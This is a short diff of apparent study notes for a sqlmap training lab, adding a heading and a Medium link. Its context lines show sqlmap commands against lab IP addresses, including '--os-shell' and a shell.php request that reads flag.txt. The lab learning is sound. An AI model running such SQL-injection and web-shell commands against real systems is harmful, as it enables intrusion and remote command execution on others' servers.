@@ -15,7 +15,7 @@ sqlmap -r req.txt
 sqlmap -u "http://46.101.23.188:30063/case2.php" --batch
 sqlmap 'http://46.101.23.188:30063/case2.php' --data 'uid=1'
 
-Cheat Sheet
+# Cheat Sheet
 The cheat sheet is as a useful command reference for this module.
 
 Command	Description
@@ -191,7 +191,7 @@ Use SQLMap to get an interactive OS shell on the remote host and try to find ano
    47  sqlmap -u "http://134.209.176.83:31022/?id=1" --os-shell
    in browser DO http://134.209.176.83:31022/shell.php?cmd=cat+/flag.txt
 
-
+https://medium.com/@joshthedev/step-13-sqlmap-essentials-68829d907492
 
 
 
